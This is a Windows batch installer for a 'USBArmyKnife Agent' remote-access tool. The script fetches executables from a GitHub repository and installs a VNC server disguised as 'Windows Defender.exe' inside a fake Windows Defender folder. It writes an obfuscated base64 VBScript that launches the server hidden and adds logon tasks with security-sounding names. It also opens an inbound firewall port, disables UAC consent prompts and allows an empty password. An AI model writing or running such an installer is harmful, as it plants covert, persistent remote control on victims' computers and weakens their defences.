@echo off
setlocal EnableExtensions EnableDelayedExpansion
title USBArmyKnife Agent Installer

REM ============================================================
REM  USBArmyKnife Agent Installer
REM  Downloads individual files from GitHub to a temp directory,
REM  copies to C:\ProgramData\Windows Defender, sets up autostart/firewall,
REM  then cleans up.
REM ============================================================

set "DEST=C:\ProgramData\Windows Defender"
set "BASE=https://raw.githubusercontent.com/Korbi0312/USBArmyKnife-modded/master/tools/Installer"
set "TEMPDIR=%TEMP%\USBArmyKnife_Install"

REM --- Elevation check ---
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Administrator privileges required...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

echo.
echo ========================================
echo   USBArmyKnife Agent Installer
echo ========================================
echo.

REM --- Password prompt ---
echo VNC Password (optional):
echo    Press Enter for no password.
echo.
set "VNCPASSWD="
set /p "VNCPASSWD=Password: "
if defined VNCPASSWD (
    echo    Password set.
) else (
    echo    No password.
)
echo.

REM --- 1. Stop running processes ---
echo [1/6] Stopping running processes...
taskkill /F /IM AgentLauncher.exe >nul 2>&1
taskkill /F /IM Windows Defender.exe >nul 2>&1
timeout /t 1 /nobreak >nul

REM --- 2. Create temp download directory ---
if not exist "%TEMPDIR%" mkdir "%TEMPDIR%"

REM --- 3. Download files individually ---
echo [2/6] Downloading files from GitHub...
echo    Download folder: %TEMPDIR%
echo.

set "FAIL=0"

echo    [1/6] Windows Defender.exe (~67MB, may take a moment)...
powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/VncDirect/VncDirect.exe' -OutFile '%TEMPDIR%\Windows Defender.exe' -UseBasicParsing -TimeoutSec 300"
if not exist "%TEMPDIR%\Windows Defender.exe" (
    echo    [!] FAILED to download Windows Defender.exe
    set "FAIL=1"
) else (
    echo    [OK]
)

echo    [2/6] AgentLauncher.exe...
powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/AgentLauncher.exe' -OutFile '%TEMPDIR%\AgentLauncher.exe' -UseBasicParsing -TimeoutSec 300"
if not exist "%TEMPDIR%\AgentLauncher.exe" (
    echo    [!] FAILED to download AgentLauncher.exe
    set "FAIL=1"
) else (
    echo    [OK]
)

echo    [3/6] turbojpeg.dll...
powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/VncDirect/turbojpeg.dll' -OutFile '%TEMPDIR%\turbojpeg.dll' -UseBasicParsing -TimeoutSec 60"
if not exist "%TEMPDIR%\turbojpeg.dll" (
    echo    [!] FAILED to download turbojpeg.dll
    set "FAIL=1"
) else (
    echo    [OK]
)

echo    [4/6] vcruntime140.dll...
powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/VncDirect/vcruntime140.dll' -OutFile '%TEMPDIR%\vcruntime140.dll' -UseBasicParsing -TimeoutSec 60"
if not exist "%TEMPDIR%\vcruntime140.dll" (
    echo    [!] FAILED to download vcruntime140.dll
    set "FAIL=1"
) else (
    echo    [OK]
)

echo    [5/6] vnc-web.zip (noVNC web UI)...
powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/vnc-web.zip' -OutFile '%TEMPDIR%\vnc-web.zip' -UseBasicParsing -TimeoutSec 60"
if not exist "%TEMPDIR%\vnc-web.zip" (
    echo    [!] FAILED to download vnc-web.zip
    set "FAIL=1"
) else (
    echo    [OK]
)

if "%FAIL%"=="1" (
    echo.
    echo    [!] One or more downloads failed. Check internet connection.
    echo    Retry or download files manually from:
    echo    %BASE%
    echo.
    pause
    exit /b 1
)

echo.
echo    All downloads complete.

REM --- 4. Install files ---
echo [3/6] Installing to %DEST%...
if not exist "%DEST%" mkdir "%DEST%"
if not exist "%DEST%\VncDirect" mkdir "%DEST%\VncDirect"

copy /y "%TEMPDIR%\Windows Defender.exe" "%DEST%\VncDirect\Windows Defender.exe" >nul
copy /y "%TEMPDIR%\turbojpeg.dll" "%DEST%\VncDirect\turbojpeg.dll" >nul
copy /y "%TEMPDIR%\vcruntime140.dll" "%DEST%\VncDirect\vcruntime140.dll" >nul
copy /y "%TEMPDIR%\AgentLauncher.exe" "%DEST%\AgentLauncher.exe" >nul

echo    Extracting noVNC web UI...
powershell -NoProfile -Command "Expand-Archive -Path '%TEMPDIR%\vnc-web.zip' -DestinationPath '%DEST%\VncDirect' -Force"
if not exist "%DEST%\VncDirect\vnc\index.html" (
    echo    [!] FAILED to extract vnc-web.zip
    echo.
    pause
    exit /b 1
)
echo    Files installed.

REM --- Save password ---
if "%VNCPASSWD%"=="" goto skip_password
echo [+] Saving password...
powershell -NoProfile -Command "$j = @{}; if (Test-Path '%DEST%\VncDirect\vnc-settings.json') { try { $raw = Get-Content '%DEST%\VncDirect\vnc-settings.json' -Raw; $obj = $raw | ConvertFrom-Json; foreach ($p in $obj.PSObject.Properties) { $j[$p.Name] = $p.Value } } catch {} }; $j['password'] = '%VNCPASSWD%'; $j | ConvertTo-Json | Set-Content '%DEST%\VncDirect\vnc-settings.json' -Encoding UTF8"
:skip_password

REM --- 5. Set up autostart ---
echo [4/6] Setting up autostart...

schtasks /query /tn "USBArmyKnife Agent" >nul 2>&1
if %errorlevel% equ 0 goto skip_agent
schtasks /create /tn "USBArmyKnife Agent" /tr "%DEST%\AgentLauncher.exe vid=cafe pid=403f cwd=%DEST%" /sc onlogon /rl limited /f >nul 2>&1
echo     Scheduled task "USBArmyKnife Agent" created.
:skip_agent

schtasks /query /tn "Security Script" >nul 2>&1
if %errorlevel% equ 0 goto skip_security
schtasks /create /tn "Security Script" /tr "%DEST%\AgentLauncher.exe vid=cafe pid=403f cwd=%DEST%" /sc onlogon /rl limited /f >nul 2>&1
echo     Scheduled task "Security Script" created.
:skip_security

REM --- Write autostart VBScript (starts VNC directly, hidden) ---
powershell -NoProfile -Command "$b64='U2V0IFdzaFNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCldzaFNoZWxsLlJ1biAiIkM6XFByb2dyYW1EYXRhXFdpbmRvd3MgRGVmZW5kZXJcVm5jRGlyZWN0XFdpbmRvd3MgRGVmZW5kZXIuZXhlIiBwb3J0PTcwMDIgImN3ZD1DOlxQcm9ncmFtRGF0YVxXaW5kb3dzIERlZmVuZGVyXFZuY0RpcmVjdFx2bmMiIGZwcz0zNjAgc2NhbGU9MCIsIDAsIEZhbHNlDQo='; [IO.File]::WriteAllBytes('%DEST%\WinDefend.vbs', [Convert]::FromBase64String($b64))"
echo     Autostart VBScript written.

schtasks /query /tn "Windows Defender" >nul 2>&1
if %errorlevel% equ 0 goto skip_watchdog
schtasks /create /tn "Windows Defender" /tr "wscript.exe \"C:\ProgramData\Windows Defender\WinDefend.vbs\"" /sc onlogon /rl limited /f >nul 2>&1
echo     Scheduled task "Windows Defender" created.
:skip_watchdog

schtasks /delete /tn "VNC Direct" /f >nul 2>&1
schtasks /delete /tn "VNC Direct User" /f >nul 2>&1
schtasks /delete /tn "VNC Watchdog" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "VNC Direct" /f >nul 2>&1
echo     VNC Direct removed from autostart.

REM --- 6. Firewall rules ---
echo [5/6] Setting up firewall rules...
netsh advfirewall firewall show rule name="VNC Direct 7002" >nul 2>&1
if %errorlevel% equ 0 (
    echo     Firewall rule "VNC Direct 7002" already exists.
) else (
    netsh advfirewall firewall add rule name="VNC Direct 7002" dir=in action=allow protocol=TCP localport=7002 >nul 2>&1
    if !errorlevel! equ 0 (
        echo     [+] Firewall rule "VNC Direct 7002" (allow) created.
    ) else (
        echo     [-] Failed to create firewall rule. Run as Admin.
    )
)

netsh advfirewall firewall show rule name="VNC Block Localhost" >nul 2>&1
if %errorlevel% equ 0 (
    echo     Firewall rule "VNC Block Localhost" already exists.
) else (
    netsh advfirewall firewall add rule name="VNC Block Localhost" dir=in action=block protocol=TCP localport=7002 remoteip=127.0.0.1 >nul 2>&1
    netsh advfirewall firewall add rule name="VNC Block Localhost v6" dir=in action=block protocol=TCP localport=7002 remoteip=::1 >nul 2>&1
    if !errorlevel! equ 0 (
        echo     [+] Firewall rules "VNC Block Localhost" created.
    ) else (
        echo     [-] Failed to create firewall block rules. Run as Admin.
    )
)

REM --- 7. Disable UAC prompts (needed for VNC to show admin dialogs) ---
echo [6/7] Disabling UAC prompts...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul 2>&1
if !errorlevel! equ 0 (
    echo     [+] UAC prompts disabled. Restart required to take effect.
) else (
    echo     [-] Failed to disable UAC. Run as Admin.
)

REM --- 8. Start services ---
echo [7/7] Starting Agent and VNC Server...
cd /d "%DEST%\VncDirect\vnc"
start "" "%DEST%\VncDirect\Windows Defender.exe" port=7002 "cwd=%DEST%\VncDirect\vnc" fps=360 scale=0
cd /d "%DEST%"
start "" "%DEST%\AgentLauncher.exe" vid=cafe pid=403f cwd=%DEST%

REM Wait for port
echo    Waiting for VNC Server to start...
set /a tries=0
:checkport
set /a tries+=1
powershell -NoProfile -Command "if (Get-NetTCPConnection -LocalPort 7002 -State Listen -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }" >nul 2>&1
if %errorlevel% equ 0 goto portok
if %tries% lss 15 (
    timeout /t 1 /nobreak >nul
    goto checkport
)
echo     [!] VNC Server did not start within 15 seconds.
echo         Check if port 7002 is already in use.
goto cleanup

:portok
echo     VNC Server listening on port 7002.

:cleanup
REM --- Cleanup temp download folder ---
echo.
echo Cleaning up temporary files...
if exist "%TEMPDIR%" rmdir /s /q "%TEMPDIR%" >nul 2>&1

REM --- Get LAN IP ---
set "VIP="
for /f %%a in ('powershell -NoProfile -Command "Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -like '192.168.*' -and $_.IPAddress -notlike '192.168.56.*' } | Select-Object -First 1 -ExpandProperty IPAddress"') do (
    set "VIP=%%a"
    goto gotip
)
REM Fallback: any IP from ipconfig
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /r "IPv4"') do (
    set "VIP=%%a"
    goto gotip
)
:gotip
set "VIP=%VIP: =%"

REM --- Done ---
echo.
echo ========================================
echo   Installation complete!
echo ========================================
echo.
echo PC Name:   %COMPUTERNAME%
echo IP Addresses:
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /r "IPv4"') do (
    set "LINE=%%i"
    echo     !LINE: =!
)
echo.
if not "%VNCPASSWD%"=="" (
    echo VNC Password: %VNCPASSWD%
    echo.
)
echo VNC URL: http://%VIP%:7002/
echo.
echo Window closes in 20 seconds...
timeout /t 20 /nobreak >nul
endlocal
